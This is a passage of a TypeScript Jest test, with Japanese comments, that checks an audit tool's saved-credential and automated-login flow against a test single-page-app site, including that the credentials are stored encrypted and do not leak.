      .toEqual({ username: SPA_LOGIN_FIELDS.email, password: SPA_LOGIN_FIELDS.password, submit: SPA_LOGIN_FIELDS.submit });
    expect(manager.getAuditJob(secondId)?.loginStage?.autoRegistration).toMatchObject({ result: 'SAVED', automatedLogin: 'SWITCHED' });
    expect(manager.getAuditJob(secondId)?.loginStage?.autoRegistration).not.toHaveProperty('automatedLoginReason');
    expect(getProfile(space.database, PROFILE_ID)?.profile.auth).toBe('AUTOMATED_LOGIN');
    const decrypted = await createCredentialStore(space.directory).decrypt(PROFILE_ID, space.site.origin);
    expect(decrypted.username === space.typed.username && decrypted.password === space.typed.password).toBe(true);
    const loginsAfterSecond = space.site.successfulLogins();

    // 3 回目: 押すだけ（自動ログイン。欄は遅れて出るが、欄を待ってから確かめて入れる）。
    const ipcBeforeThird = space.ipc.length;
    const third = await waitForChainEnd(manager, await startChain(manager));
    expect(third.stages.map(({ kind, state }) => [kind, state])).toEqual([['AUDIT', 'DONE'], ['DISCOVERY', 'DONE'], ['READ_CHECK', 'NOT_NEEDED']]);
    const thirdStart = space.ipc.slice(ipcBeforeThird).find((message) => (message as Record<string, unknown>)['type'] === 'START') as
      { readonly authentication?: { readonly automatedLogin?: unknown } } | undefined;
    expect(thirdStart?.authentication?.automatedLogin).toBeDefined();
    expect(space.site.successfulLogins()).toBe(loginsAfterSecond + 1);
    expect(leakedPlaces()).toEqual([]);
  }, TEST_TIMEOUT_MS);
});
